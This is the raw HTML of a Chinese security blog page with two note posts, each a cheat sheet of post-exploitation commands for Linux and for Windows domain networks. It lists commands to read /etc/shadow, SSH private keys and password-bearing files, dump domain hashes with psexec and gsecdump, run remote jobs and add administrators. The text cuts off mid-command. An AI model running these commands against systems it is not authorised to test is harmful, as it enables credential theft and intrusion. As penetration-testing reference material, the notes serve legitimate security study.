-                 <span class="post-meta-item-text">阅读次数 </span>
-               
-                 <span class="leancloud-visitors-count"></span>
-             </span>
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">阅读时长</span>
-                
-                <span title="阅读时长">
-                  
-                </span>
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>上次总结了windows系统在内网渗透和提权中的常用命令，这篇总结下linux在内网渗透中常用的命令。</p>
-<h2 id="0x01-查看操作系统信息"><a href="#0x01-查看操作系统信息" class="headerlink" title="0x01 查看操作系统信息"></a>0x01 查看操作系统信息</h2><h4 id="操作系统版本"><a href="#操作系统版本" class="headerlink" title="操作系统版本"></a>操作系统版本</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/issue</span><br><span class="line">cat /etc/*-release</span><br><span class="line">cat /etc/lsb-release      # Debian </span><br><span class="line">cat /etc/redhat-release   # Redhat</span><br></pre></td></tr></table></figure>
-<h4 id="内核版本"><a href="#内核版本" class="headerlink" title="内核版本"></a>内核版本</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/version</span><br><span class="line">uname -a</span><br><span class="line">uname -mrs</span><br><span class="line">rpm -q kernel</span><br><span class="line">dmesg | grep Linux</span><br><span class="line">ls /boot | grep vmlinuz-</span><br></pre></td></tr></table></figure>
-<h4 id="环境变量"><a href="#环境变量" class="headerlink" title="环境变量"></a>环境变量</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/profile</span><br><span class="line">cat /etc/bashrc</span><br><span class="line">cat ~/.bash_profile</span><br><span class="line">cat ~/.bashrc</span><br><span class="line">cat ~/.bash_logout</span><br><span class="line">env</span><br><span class="line">set</span><br></pre></td></tr></table></figure>
-<h2 id="0x02-应用和服务"><a href="#0x02-应用和服务" class="headerlink" title="0x02 应用和服务"></a>0x02 应用和服务</h2><h4 id="正在运行的程序和权限"><a href="#正在运行的程序和权限" class="headerlink" title="正在运行的程序和权限"></a>正在运行的程序和权限</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ps aux</span><br><span class="line">ps -ef</span><br><span class="line">top</span><br><span class="line">cat /etc/services</span><br></pre></td></tr></table></figure>
-<p>如果要查询root权限运行的进程，可以补充为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ps aux | grep root</span><br><span class="line">ps -ef | grep root</span><br></pre></td></tr></table></figure></p>
-<h4 id="应用"><a href="#应用" class="headerlink" title="应用"></a>应用</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ls -alh /usr/bin/</span><br><span class="line">ls -alh /sbin/</span><br><span class="line">dpkg -l</span><br><span class="line">rpm -qa</span><br><span class="line">ls -alh /var/cache/apt/archives</span><br><span class="line">ls -alh /var/cache/yum/</span><br></pre></td></tr></table></figure>
-<h4 id="服务的配置文件"><a href="#服务的配置文件" class="headerlink" title="服务的配置文件"></a>服务的配置文件</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/syslog.conf</span><br><span class="line">cat /etc/chttp.conf</span><br><span class="line">cat /etc/lighttpd.conf</span><br><span class="line">cat /etc/cups/cupsd.conf</span><br><span class="line">cat /etc/inetd.conf</span><br><span class="line">cat /etc/apache2/apache2.conf</span><br><span class="line">cat /etc/my.conf</span><br><span class="line">cat /etc/httpd/conf/httpd.conf</span><br><span class="line">cat /opt/lampp/etc/httpd.conf</span><br><span class="line">ls -aRl /etc/ | awk &apos;$1 ~ /^.*r.*/&apos;</span><br></pre></td></tr></table></figure>
-<h4 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">crontab -l</span><br><span class="line">ls -alh /var/spool/cron</span><br><span class="line">ls -al /etc/ | grep cron</span><br><span class="line">ls -al /etc/cron*</span><br><span class="line">cat /etc/cron*</span><br><span class="line">cat /etc/at.allow</span><br><span class="line">cat /etc/at.deny</span><br><span class="line">cat /etc/cron.allow</span><br><span class="line">cat /etc/cron.deny</span><br><span class="line">cat /etc/crontab</span><br><span class="line">cat /etc/anacrontab</span><br><span class="line">cat /var/spool/cron/crontabs/root</span><br></pre></td></tr></table></figure>
-<h4 id="存储的明文用户名，密码"><a href="#存储的明文用户名，密码" class="headerlink" title="存储的明文用户名，密码"></a>存储的明文用户名，密码</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">grep -i user [filename]</span><br><span class="line">grep -i pass [filename]</span><br><span class="line">grep -C 5 &quot;password&quot; [filename]</span><br><span class="line">find . -name &quot;*.php&quot; -print0 | xargs -0 grep -i -n &quot;var $password&quot;   # Joomla</span><br></pre></td></tr></table></figure>
-<h2 id="0x03-网络相关"><a href="#0x03-网络相关" class="headerlink" title="0x03 网络相关"></a>0x03 网络相关</h2><h4 id="网络地址"><a href="#网络地址" class="headerlink" title="网络地址"></a>网络地址</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ifconfig -a</span><br><span class="line">cat /etc/network/interfaces</span><br><span class="line">cat /etc/sysconfig/network</span><br></pre></td></tr></table></figure>
-<h4 id="网络配置-DNS-DHCP-网关"><a href="#网络配置-DNS-DHCP-网关" class="headerlink" title="网络配置,DNS,DHCP,网关"></a>网络配置,DNS,DHCP,网关</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/resolv.conf</span><br><span class="line">cat /etc/sysconfig/network</span><br><span class="line">cat /etc/networks</span><br><span class="line">iptables -L</span><br><span class="line">hostname</span><br><span class="line">dnsdomainname</span><br></pre></td></tr></table></figure>
-<h4 id="网络通信"><a href="#网络通信" class="headerlink" title="网络通信"></a>网络通信</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">lsof -i</span><br><span class="line">lsof -i :80</span><br><span class="line">grep 80 /etc/services</span><br><span class="line">netstat -antup</span><br><span class="line">netstat -antpx</span><br><span class="line">netstat -tulpn</span><br><span class="line">chkconfig --list</span><br><span class="line">chkconfig --list | grep 3:on</span><br><span class="line">last</span><br><span class="line">w</span><br></pre></td></tr></table></figure>
-<h4 id="路由缓存"><a href="#路由缓存" class="headerlink" title="路由缓存"></a>路由缓存</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">arp -e</span><br><span class="line">route</span><br><span class="line">route -nee</span><br></pre></td></tr></table></figure>
-<h2 id="0x04-用户相关"><a href="#0x04-用户相关" class="headerlink" title="0x04 用户相关"></a>0x04 用户相关</h2><h4 id="用户信息"><a href="#用户信息" class="headerlink" title="用户信息"></a>用户信息</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">id</span><br><span class="line">who</span><br><span class="line">w</span><br><span class="line">last</span><br><span class="line">cat /etc/passwd</span><br><span class="line">cat /etc/group</span><br><span class="line">cat /etc/shadow</span><br><span class="line">ls -alh /var/mail/</span><br><span class="line">grep -v -E &quot;^#&quot; /etc/passwd | awk -F: &apos;$3 == 0 &#123; print $1&#125;&apos;   # 列出超级用户</span><br><span class="line">awk -F: &apos;($3 == &quot;0&quot;) &#123;print&#125;&apos; /etc/passwd   #列出超级用户</span><br><span class="line">cat /etc/sudoers</span><br><span class="line">sudo -l</span><br></pre></td></tr></table></figure>
-<h4 id="列主目录"><a href="#列主目录" class="headerlink" title="列主目录"></a>列主目录</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ls -ahlR /root/</span><br><span class="line">ls -ahlR /home/</span><br></pre></td></tr></table></figure>
-<h4 id="其他用户的操作记录"><a href="#其他用户的操作记录" class="headerlink" title="其他用户的操作记录"></a>其他用户的操作记录</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cat ~/.bash_history</span><br><span class="line">cat ~/.nano_history</span><br><span class="line">cat ~/.atftp_history</span><br><span class="line">cat ~/.mysql_history</span><br><span class="line">cat ~/.php_history</span><br></pre></td></tr></table></figure>
-<h4 id="ssh私钥"><a href="#ssh私钥" class="headerlink" title="ssh私钥"></a>ssh私钥</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">cat ~/.ssh/authorized_keys</span><br><span class="line">cat ~/.ssh/identity.pub</span><br><span class="line">cat ~/.ssh/identity</span><br><span class="line">cat ~/.ssh/id_rsa.pub</span><br><span class="line">cat ~/.ssh/id_rsa</span><br><span class="line">cat ~/.ssh/id_dsa.pub</span><br><span class="line">cat ~/.ssh/id_dsa</span><br><span class="line">cat /etc/ssh/ssh_config</span><br><span class="line">cat /etc/ssh/sshd_config</span><br><span class="line">cat /etc/ssh/ssh_host_dsa_key.pub</span><br><span class="line">cat /etc/ssh/ssh_host_dsa_key</span><br><span class="line">cat /etc/ssh/ssh_host_rsa_key.pub</span><br><span class="line">cat /etc/ssh/ssh_host_rsa_key</span><br><span class="line">cat /etc/ssh/ssh_host_key.pub</span><br><span class="line">cat /etc/ssh/ssh_host_key</span><br></pre></td></tr></table></figure>
-<h2 id="0x05-文件系统相关"><a href="#0x05-文件系统相关" class="headerlink" title="0x05 文件系统相关"></a>0x05 文件系统相关</h2><h4 id="日志文件"><a href="#日志文件" class="headerlink" title="日志文件"></a>日志文件</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">ls -alh /var/log</span><br><span class="line">ls -alh /var/mail</span><br><span class="line">ls -alh /var/spool</span><br><span class="line">ls -alh /var/spool/lpd</span><br><span class="line">ls -alh /var/lib/pgsql</span><br><span class="line">ls -alh /var/lib/mysql</span><br><span class="line">cat /var/lib/dhcp3/dhclient.lea</span><br><span class="line">cat /etc/httpd/logs/access_log</span><br><span class="line">cat /etc/httpd/logs/access.log</span><br><span class="line">cat /etc/httpd/logs/error_log</span><br><span class="line">cat /etc/httpd/logs/error.log</span><br><span class="line">cat /var/log/apache2/access_log</span><br><span class="line">cat /var/log/apache2/access.log</span><br><span class="line">cat /var/log/apache2/error_log</span><br><span class="line">cat /var/log/apache2/error.log</span><br><span class="line">cat /var/log/apache/access_log</span><br><span class="line">cat /var/log/apache/access.log</span><br><span class="line">cat /var/log/auth.log</span><br><span class="line">cat /var/log/chttp.log</span><br><span class="line">cat /var/log/cups/error_log</span><br><span class="line">cat /var/log/dpkg.log</span><br><span class="line">cat /var/log/faillog</span><br><span class="line">cat /var/log/httpd/access_log</span><br><span class="line">cat /var/log/httpd/access.log</span><br><span class="line">cat /var/log/httpd/error_log</span><br><span class="line">cat /var/log/httpd/error.log</span><br><span class="line">cat /var/log/lastlog</span><br><span class="line">cat /var/log/lighttpd/access.log</span><br><span class="line">cat /var/log/lighttpd/error.log</span><br><span class="line">cat /var/log/lighttpd/lighttpd.access.log</span><br><span class="line">cat /var/log/lighttpd/lighttpd.error.log</span><br><span class="line">cat /var/log/messages</span><br><span class="line">cat /var/log/secure</span><br><span class="line">cat /var/log/syslog</span><br><span class="line">cat /var/log/wtmp</span><br><span class="line">cat /var/log/xferlog</span><br><span class="line">cat /var/log/yum.log</span><br><span class="line">cat /var/run/utmp</span><br><span class="line">cat /var/webmin/miniserv.log</span><br><span class="line">cat /var/www/logs/access_log</span><br><span class="line">cat /var/www/logs/access.log</span><br><span class="line">ls -alh /var/lib/dhcp3/</span><br><span class="line">ls -alh /var/log/postgresql/</span><br><span class="line">ls -alh /var/log/proftpd/</span><br><span class="line">ls -alh /var/log/samba/</span><br></pre></td></tr></table></figure>
-<h4 id="网站文件"><a href="#网站文件" class="headerlink" title="网站文件"></a>网站文件</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ls -alhR /var/www/</span><br><span class="line">ls -alhR /srv/www/htdocs/</span><br><span class="line">ls -alhR /usr/local/www/apache22/data/</span><br><span class="line">ls -alhR /opt/lampp/htdocs/</span><br><span class="line">ls -alhR /var/www/html/</span><br></pre></td></tr></table></figure>
-<h4 id="文件挂载"><a href="#文件挂载" class="headerlink" title="文件挂载"></a>文件挂载</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mount</span><br><span class="line">df -h</span><br><span class="line">cat /etc/fstab</span><br></pre></td></tr></table></figure>
-<h4 id="可写目录"><a href="#可写目录" class="headerlink" title="可写目录"></a>可写目录</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">find / -writable -type d 2&gt;/dev/null      # 可写目录</span><br><span class="line">find / -perm -222 -type d 2&gt;/dev/null     # 可写目录 </span><br><span class="line">find / -perm -o w -type d 2&gt;/dev/null     # 可写目录</span><br><span class="line">find / -perm -o x -type d 2&gt;/dev/null     # 可执行目录</span><br><span class="line">find / \( -perm -o w -perm -o x \) -type d 2&gt;/dev/null   # 可写可执行目录</span><br></pre></td></tr></table></figure>
-<h2 id="0x06-准备与攻击"><a href="#0x06-准备与攻击" class="headerlink" title="0x06 准备与攻击"></a>0x06 准备与攻击</h2><h4 id="语言支持"><a href="#语言支持" class="headerlink" title="语言支持"></a>语言支持</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">find / -name perl*</span><br><span class="line">find / -name python*</span><br><span class="line">find / -name gcc*</span><br><span class="line">find / -name cc</span><br></pre></td></tr></table></figure>
-<h4 id="上传方式"><a href="#上传方式" class="headerlink" title="上传方式"></a>上传方式</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">find / -name wget</span><br><span class="line">find / -name nc*</span><br><span class="line">find / -name netcat*</span><br><span class="line">find / -name tftp*</span><br><span class="line">find / -name ftp</span><br></pre></td></tr></table></figure>
-<h4 id="寻找exp"><a href="#寻找exp" class="headerlink" title="寻找exp"></a>寻找exp</h4><ul>
-<li><a href="http://www.exploit-db.com" target="_blank" rel="noopener">http://www.exploit-db.com</a></li>
-<li><a href="http://1337day.com" target="_blank" rel="noopener">http://1337day.com</a></li>
-<li><a href="http://www.securiteam.com" target="_blank" rel="noopener">http://www.securiteam.com</a></li>
-<li><a href="http://www.securityfocus.com" target="_blank" rel="noopener">http://www.securityfocus.com</a></li>
-<li><a href="http://www.exploitsearch.net" target="_blank" rel="noopener">http://www.exploitsearch.net</a></li>
-<li><a href="http://metasploit.com/modules/" target="_blank" rel="noopener">http://metasploit.com/modules/</a></li>
-<li><a href="http://securityreason.com" target="_blank" rel="noopener">http://securityreason.com</a></li>
-<li><a href="http://seclists.org/fulldisclosure/" target="_blank" rel="noopener">http://seclists.org/fulldisclosure/</a></li>
-<li><a href="http://www.google.com" target="_blank" rel="noopener">http://www.google.com</a></li>
-</ul>
-<h4 id="编译exp"><a href="#编译exp" class="headerlink" title="编译exp"></a>编译exp</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">which gcc</span><br><span class="line">gcc exp.c -o exp</span><br></pre></td></tr></table></figure>
-<h4 id="运行exp"><a href="#运行exp" class="headerlink" title="运行exp"></a>运行exp</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod +x exp</span><br><span class="line">./exp</span><br></pre></td></tr></table></figure>
-
-          
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/05/05/内网渗透常用命令总结（windows）/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="麻薯">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/uploads/avatar.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Leticia's Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/2018/05/05/内网渗透常用命令总结（windows）/" itemprop="url">
-                  内网渗透常用命令总结（windows）
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-05-05T21:55:03+08:00">
-                2018-05-05
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/笔记/" itemprop="url" rel="index">
-                    <span itemprop="name">笔记</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-             <span id="/2018/05/05/内网渗透常用命令总结（windows）/" class="leancloud_visitors" data-flag-title="内网渗透常用命令总结（windows）">
-               <span class="post-meta-divider">|</span>
-               <span class="post-meta-item-icon">
-                 <i class="fa fa-eye"></i>
-               </span>
-               
-                 <span class="post-meta-item-text">阅读次数 </span>
-               
-                 <span class="leancloud-visitors-count"></span>
-             </span>
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">阅读时长</span>
-                
-                <span title="阅读时长">
-                  
-                </span>
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>对内网渗透这里很多知识技巧不了解，所以认真看了几天，顺便总结下windows内网渗透的常用命令。</p>
-<h2 id="0x01-查看域信息"><a href="#0x01-查看域信息" class="headerlink" title="0x01 查看域信息"></a>0x01 查看域信息</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">net group /domain                        //获得所有域用户组列表 </span><br><span class="line">net group qq_group /domain               //显示域中qq_group组的成员 </span><br><span class="line">net group qq_group /del /domain          //删除域中qq_group组</span><br><span class="line">net group qq_group qq /del /domain       //删除域内qq_group 群组中的成员QQ</span><br><span class="line">net group qq_group /add /domain          //增加域中的群组</span><br><span class="line">net group &quot;domain admins&quot;  /domain       //获得域管理员列表</span><br><span class="line">net group &quot;enterprise admins&quot; /domain    //获得企业管理员列表</span><br><span class="line">net localgroup administrators /domain    //获取域内置administrators组用（enterprise admins、domain admins）</span><br><span class="line">net group &quot;domain controllers&quot;  /domain   //获得域控制器列表</span><br><span class="line">net group &quot;domain computers&quot;  /domain    //获得所有域成员计算机列表</span><br><span class="line">net user /domain                        //获得所有域用户列表</span><br><span class="line">net user someuser /domain              //获得指定账户someuser的详细信息</span><br><span class="line">net accounts /domain                //获得域密码策略设置，密码长短，错误锁定等信息</span><br><span class="line">nei view /domain                   //查询有几个域, 查询域列表</span><br><span class="line">net view /domain:testdomain       //查看 testdomain域中的计算机列表</span><br><span class="line">nltest /domain_trusts              //获取域信任信息</span><br><span class="line">net user domain-admin /domain      //查看管理员登陆时间，密码过期时间，是否有登陆脚本，组分配等信息</span><br><span class="line">net config Workstation         //查询机器属于哪个域</span><br><span class="line">net time /domian               //查询主域服务器的时间</span><br><span class="line">echo %logonserver%              //查看登陆到这台服务器的计算机名</span><br><span class="line">net time  \\192.168.1.1         //查询远程共享主机192.168.1.1的时间</span><br><span class="line">net use \\IP\ipc$ password /user:username@domain     //ipc$域内连接</span><br><span class="line">net  view  \\dc2.backlion.com         //查看域控共享情况</span><br><span class="line">dir \\dc2.backlion.com\SYSVOL /s /a &gt; sysvol.txt  //列出sysvol日志记录</span><br><span class="line">xcopy \\dc2.backlion.com\sysvol.txt  sysvol.txt  /i  /e  /c //远程拷贝到本地sysvol日志</span><br><span class="line">net user  /domain  bk  bk123                 //修改域内用户密码，需要管理员权限</span><br><span class="line">net  localgroup  administartors   SEZKL\backlion  /add      //将SEZKL域中的用户backlion添加到administrators组中</span><br><span class="line">mstsc /admin                 //远程桌面登录到console会话解决hash无法抓出问题</span><br><span class="line">gpupdate/force                  //更新域策略</span><br><span class="line">psexec  \\192.168.1.3  -u  administrator  -p  bk1234  -c  gsecdump.exe  -u</span><br><span class="line">  //从域服务器密码存储文件windows/ntds/ntds.dit导出hash值出来</span><br><span class="line">gsecdump  -a        //获取域登管理员登录过得hash值，这里gescdump为第三方导出AD域的hash值</span><br><span class="line">tasklist /S ip /U domain\username /P /V     //查看远程计算机进程列</span><br></pre></td></tr></table></figure>
-<h2 id="0x02-基本命令"><a href="#0x02-基本命令" class="headerlink" title="0x02 基本命令"></a>0x02 基本命令</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">ipconfig/all    //查看IP地址</span><br><span class="line">ipconfig /release  //释放地址</span><br><span class="line">ipconfig /renew 重新获取Ip地址</span><br><span class="line">whoami    //查询账号所属权限</span><br><span class="line">whoami/all  //查看sid值</span><br><span class="line">systeminfo  //查询系统以及补丁信息</span><br><span class="line">tasklist /svc   //查看进程</span><br><span class="line">taskkill /im 进程名称(cmd)  //结束进程</span><br><span class="line">taskkill /pid[进程码] -t(结束该进程) -f(强制结束该进程以及所有子进程)</span><br><span class="line">wmic qfe  get hotfixid    //查看已安装过得补丁，这个很实用</span><br><span class="line">wmic qfe list full /format:htable &gt; hotfixes.htm  //详细的补丁安装</span><br><span class="line">wmic  qfe      //查询补丁信息以及微软提供的下载地址</span><br><span class="line">ping hostname(主机名）   //显示该机器名的IP </span><br><span class="line">net start   //查看当前运行的服务</span><br><span class="line">net user      //查看本地组的用户</span><br><span class="line">net localhroup administrators   //查看本机管理员组有哪些用户</span><br><span class="line">net use      //查看会话</span><br><span class="line">net session     //查看当前会话</span><br><span class="line">net share       //查看SMB指向的路径[即共享]</span><br><span class="line">wmic share get name,path   //查看SMB指向的路径</span><br><span class="line">wmic nteventlog get path,filename,writeable //查询系统日志文件存储位置</span><br><span class="line">net use \\IP\ipc$  password  /user:username      //建立IPC会话（工作组模式）</span><br><span class="line">net use  z:  \\192.168.1.1      //建立映射到本机Z盘</span><br><span class="line">net time \\172.16.16.2        //查询共享主机的是</span><br><span class="line">at \\172.16.16.2 13:50 c:\windows\2009.exe      //在共享主机上执行</span><br><span class="line">netstat  -ano      //查看开放的端口</span><br><span class="line">netstat -an | find “3389”   //找到3389端口</span><br><span class="line">net accounts      //查看本地密码策略</span><br><span class="line">nbtstat –A ip      //netbiso查询</span><br><span class="line">net view      //查看机器注释或许能得到当前活动状态的机器列表，如果禁用netbios就查看不出来</span><br><span class="line">echo 